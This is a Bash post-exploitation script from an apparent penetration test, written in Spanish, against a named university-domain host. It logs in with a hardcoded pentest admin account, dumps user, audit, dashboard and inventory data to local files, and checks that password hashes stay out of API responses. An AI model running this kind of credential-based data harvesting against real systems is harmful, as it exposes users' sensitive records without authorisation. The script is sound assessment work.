#!/usr/bin/env bash

set -u

TARGET_HOST="conjunta3p.espe.edu.ec"
TARGET_URL="http://${TARGET_HOST}"
OUTDIR="postexplotacion_$(date +%Y%m%d_%H%M%S)"
ADMIN_EMAIL="pentest_admin@test.com"
PASS="Password123"

c_reset="\033[0m"; c_azul="\033[1;34m"; c_verde="\033[1;32m"; c_amar="\033[1;33m"
titulo() { echo -e "\n${c_azul}==== $* ====${c_reset}"; }
ok()     { echo -e "${c_verde}[ok]${c_reset} $*"; }
aviso()  { echo -e "${c_amar}[aviso]${c_reset} $*"; }

registrar() {
  local archivo="$1"; shift
  echo -e "\n\$ $*" | tee -a "${OUTDIR}/${archivo}"
  "$@" 2>&1 | tee -a "${OUTDIR}/${archivo}"
}

command -v curl >/dev/null || { aviso "curl es imprescindible."; exit 1; }
command -v jq   >/dev/null || { aviso "jq es imprescindible."; exit 1; }

mkdir -p "${OUTDIR}"
titulo "Objetivo: ${TARGET_URL}  |  Resultados en: ${OUTDIR}/"

# --------------------------- Login como admin (Fase 5) -----------------------
ADMIN_TOKEN="$(curl -s -X POST "${TARGET_URL}/api/auth/login" -H 'Content-Type: application/json' \
  -d "{\"email\":\"${ADMIN_EMAIL}\",\"password\":\"${PASS}\"}" | jq -r '.token // empty')"
if [ -z "${ADMIN_TOKEN}" ]; then
  aviso "No se obtuvo token de ${ADMIN_EMAIL}."
  exit 1
fi
AUTH=(-H "Authorization: Bearer ${ADMIN_TOKEN}")
ok "Token de administrador obtenido."

# --------------------------- 1. Analisis de impacto --------------------------
sec_impacto() {
  titulo "1. Analisis de impacto: acceso a datos sensibles con rol admin"
  registrar "01_usuarios.txt"    curl -s "${AUTH[@]}" "${TARGET_URL}/api/usuarios"
  registrar "02_auditoria.txt"   curl -s "${AUTH[@]}" "${TARGET_URL}/api/auditoria"
  registrar "03_dashboard.txt"   curl -s "${AUTH[@]}" "${TARGET_URL}/api/dashboard"
  registrar "04_movimientos.txt" curl -s "${AUTH[@]}" "${TARGET_URL}/api/movimientos"
  ok "Un token admin expone usuarios, auditoria, dashboard e inventario."
}

# --------------------------- 2. No exposicion del hash (bcrypt) --------------
sec_bcrypt_api() {
  titulo "2. Validacion de bcrypt: la API no expone el hash de contrasena"
  echo '$ curl -s -H "Authorization: Bearer <token>" .../api/usuarios | jq ".[0]"' \
    | tee "${OUTDIR}/05_hash_api.txt"
  curl -s "${AUTH[@]}" "${TARGET_URL}/api/usuarios" | jq '.[0]' | tee -a "${OUTDIR}/05_hash_api.txt"
  ok "Ausencia del campo 'password' = el hash no se filtra por la API."
}

# --------------------------- 3. Alcance del rol admin ------------------------
sec_escalacion() {
  titulo "3. Alcance del rol admin"
  registrar "06_escalacion.txt" curl -s -o /dev/null -w "admin GET /api/usuarios  -> HTTP %{http_code}\n" \
    "${AUTH[@]}" "${TARGET_URL}/api/usuarios"
  registrar "06_escalacion.txt" curl -s -o /dev/null -w "admin GET /api/auditoria -> HTTP %{http_code}\n" \
    "${AUTH[@]}" "${TARGET_URL}/api/auditoria"
  ok "200 en rutas soloAdmin confirma el alcance total del rol escalado."
}

sec_impacto
sec_bcrypt_api
sec_escalacion

titulo "Fase 6 finalizada. Los archivos en ${OUTDIR}/"
